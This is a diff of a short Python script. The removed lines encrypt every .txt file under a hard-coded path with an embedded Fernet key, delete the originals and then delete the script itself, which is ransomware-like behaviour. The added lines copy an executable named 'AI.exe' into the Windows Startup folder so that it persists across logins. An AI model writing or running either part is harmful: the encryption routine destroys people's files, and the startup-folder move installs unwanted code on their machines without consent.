@@ -1,26 +1,19 @@
 import os
-from cryptography.fernet import Fernet
+import shutil
 
-def encrypt_files(path, key, extension):
-    f = Fernet(key)
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            if file.endswith(extension):
-                file_path = os.path.join(root, file)
-                with open(file_path, 'rb') as f1:
-                    data = f1.read()
-                encrypted_data = f.encrypt(data)
-                with open(file_path + '.enc', 'wb') as f2:
-                    f2.write(encrypted_data)
-                os.remove(file_path)
+def main():
+    #your code here
+    print("your code here")
 
-path = r'C:\share C\vscode\Pass\test'
-key = b'gQHAjOvQ8tUkqHqrfwXs8uVwdsgLmItRH4JZ2xz18l0='
-extension = '.txt'
+file = os.path.realpath("AI.exe")
 
-encrypt_files(path, key, extension)
+StartUp = os.getenv('APPDATA') + r"\Microsoft\Windows\Start Menu\Programs\Startup"
 
-def delete_script():
-    os.remove(__file__)
+#print(StartUp)
 
-delete_script()
+if os.path.exists("AI.exe"):
+    if not os.path.exists(StartUp+r"\AI.exe"):
+
+        shutil.move(file,StartUp)
+
+    main()
